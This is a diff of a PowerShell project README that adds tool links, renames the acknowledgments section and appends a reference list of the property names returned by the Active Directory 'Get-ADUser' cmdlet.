 * [WSLab](https://github.com/microsoft/WSLab) - Windows Server rapid lab deployment scripts.
 * [PoshBot](https://github.com/poshbotio/PoshBot) - Powershell-based bot framework.
 * [PoShKeePass](https://github.com/PSKeePass/PoShKeePass) - Module for working with [KeePass](https://keepass.info) databases.
-
 ## ✍️ Authors <a name = "authors"></a>
 + [@markconover](https://github.com/markconover)
-
-See also the list of [contributors](https://github.com/kylelobo/The-Documentation-Compendium/contributors) who participated in this project.
-
-## 🎉 Acknowledgements <a name = "acknowledgement"></a>
+## 🎉 Acknowledgments <a name = "acknowledgments"></a>
 + Hat tip to anyone whose code was used
 + Inspiration
 + References
+---------------------------------------------------------
+## Appendix A - "Get-ADUser" - Property List
+AccountExpirationDate                 
+accountExpires                        
+AccountLockoutTime                    
+AccountNotDelegated                   
+AllowReversiblePasswordEncryption     
+AuthenticationPolicy                  
+AuthenticationPolicySilo              
+BadLogonCount                         
+badPasswordTime                       
+badPwdCount                           
+c                                     
+CannotChangePassword                  
+CanonicalName                         
+Certificates                          
+City                                  
+CN                                    
+codePage                              
+Company                               
+CompoundIdentitySupported             
+Country                               
+countryCode                           
+Created                               
+createTimeStamp                       
+Deleted                               
+Department                            
+departmentNumber                      
+Description                           
+DisplayName                           
+DistinguishedName                     
+Division                              
+DoesNotRequirePreAuth                 
+dSCorePropagationData                 
+EmailAddress                          
+EmployeeID                            
+EmployeeNumber                        
+employeeType                          
+Enabled                               
+extensionAttribute1                   
+extensionAttribute10                  
+extensionAttribute2                   
+extensionAttribute3                   
+extensionAttribute5                   
+Fax                                   
+garbageCollPeriod                     
+gidNumber                             
+GivenName                             
+HomeDirectory                         
+HomedirRequired                       
+HomeDrive                             
+HomePage                              
+HomePhone                             
+Initials                              
+instanceType                          
+internetEncoding                      
+isDeleted                             
+KerberosEncryptionType                
+LastBadPasswordAttempt                
+LastKnownParent                       
+lastLogoff                            
+lastLogon                             
+LastLogonDate                         
+lastLogonTimestamp                    
+legacyExchangeDN                      
+LockedOut                             
+lockoutTime                           
+loginShell                            
+logonCount                            
+LogonWorkstations                     
+mail                                  
+mailNickname                          
+managedObjects                        
+Manager                               
+MemberOf                              
+MNSLogonAccount                       
+mobile                                
+MobilePhone                           
+Modified                              
+modifyTimeStamp                       
+msDS-AuthenticatedAtDC                
+msDS-ExternalDirectoryObjectId        
+msDS-SupportedEncryptionTypes         
+msDS-User-Account-Control-Computed    
+msExchAddressBookFlags                
+msExchArchiveGUID                     
+msExchArchiveName                     
+msExchArchiveQuota                    
+msExchArchiveStatus                   
+msExchArchiveWarnQuota                
+msExchBypassAudit                     
+msExchCalendarLoggingQuota            
+msExchDumpsterQuota                   
+msExchDumpsterWarningQuota            
+msExchGroupSecurityFlags              
+msExchMailboxAuditEnable              
+msExchMailboxAuditLogAgeLimit         
+msExchMDBRulesQuota                   
+msExchModerationFlags                 
+msExchPoliciesIncluded                
+msExchProvisioningFlags               
+msExchRecipientDisplayType            
+msExchRecipientSoftDeletedStatus      
+msExchRecipientTypeDetails            
+msExchRemoteRecipientType             
+msExchSafeSendersHash                 
+msExchTransportRecipientSettingsFlags 
+msExchUMDtmfMap                       
+msExchUMEnabledFlags2                 
+msExchUserAccountControl              
+msExchUserHoldPolicies                
+msExchVersion                         
+msSFU30Name                           
+msSFU30NisDomain                      
+Name                                  
+nTSecurityDescriptor                  
+ObjectCategory                        
+ObjectClass                           
+ObjectGUID                            
+objectSid                             
+Office                                
+OfficePhone                           
+Organization                          
+OtherName                             
+PasswordExpired                       
+PasswordLastSet                       
+PasswordNeverExpires                  
+PasswordNotRequired                   
+physicalDeliveryOfficeName            
+POBox                                 
+PostalCode                            
+PrimaryGroup                          
+primaryGroupID                        
+PrincipalsAllowedToDelegateToAccount  
+ProfilePath                           
+ProtectedFromAccidentalDeletion       
+protocolSettings                      
+proxyAddresses                        
+PSComputerName                        
+PSShowComputerName                    
+pwdLastSet                            
+RunspaceId                            
+SamAccountName                        
+sAMAccountType                        
+ScriptPath                            
+sDRightsEffective                     
+ServicePrincipalNames                 
+showInAddressBook                     
+SID                                   
+SIDHistory                            
+SmartcardLogonRequired                
+sn                                    
+st                                    
+State                                 
+StreetAddress                         
+Surname                               
+targetAddress                         
+textEncodedORAddress                  
+Title                                 
+TrustedForDelegation                  
+TrustedToAuthForDelegation            
+uid                                   
+uidNumber                             
+unixHomeDirectory                     
+UseDESKeyOnly                         
+userAccountControl                    
+UserPrincipalName                     
+uSNChanged                            
+uSNCreated                            
+whenChanged                           
+whenCreated
